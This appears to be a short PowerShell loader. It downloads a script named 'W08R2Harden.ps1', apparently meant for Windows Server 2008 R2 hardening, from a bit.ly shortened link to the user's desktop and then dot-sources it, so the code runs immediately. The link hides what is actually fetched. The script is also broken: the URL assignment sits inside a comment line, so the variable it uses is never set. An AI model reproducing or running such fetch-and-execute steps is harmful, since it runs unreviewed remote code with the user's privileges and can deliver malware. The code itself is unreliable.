Import-Module BitsTransfer
#Private Main Script $url = "https://bit.ly/36mYlvB"
$output = "$env:userprofile\desktop\W08R2Harden.ps1"
Start-BitsTransfer -Source $url -Destination $output
. $env:userprofile\desktop\W08R2Harden.ps1
